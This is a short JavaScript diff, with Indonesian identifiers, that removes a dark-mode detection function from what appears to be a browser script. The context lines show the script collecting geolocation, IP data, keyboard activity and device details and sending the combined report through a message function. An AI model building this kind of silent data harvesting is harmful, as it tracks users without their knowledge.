@@ -563,17 +563,6 @@ Bluetooth              : ${bluetoothStatus}
 `.trim();
 };
 
-const ambilKecerahanMode = () => {
-  const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Ya' : 'Tidak';
-  const preferensi = darkMode === 'Ya' ? 'dark' : 'light';
-
-  return `
-౼ 〘 𝗞𝗘𝗖𝗘𝗥𝗔𝗛𝗔𝗡 & 𝗠𝗢𝗗𝗘 〙 ౼
-Mode Gelap Aktif       : ${darkMode}
-Preferensi Warna       : ${preferensi}
-`.trim();
-};
-
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -654,8 +643,7 @@ const mulai = async () => {
   // Fitur tambahan
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
-  const outputAudio = await ambilOutputAudio();
-  const kecerahanMode = ambilKecerahanMode(); // ✅ Tambah di sini
+  const outputAudio = await ambilOutputAudio(); // ✅ Tambah di sini
 
   const gabungAwal = [
     infoPerangkat,
@@ -667,8 +655,7 @@ const mulai = async () => {
     ipInfo,
     keyboard,
     perangkatEksternal,
-    outputAudio,
-    kecerahanMode // ✅ Tambahkan di sini
+    outputAudio                // ✅ Tambah ke array ini
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
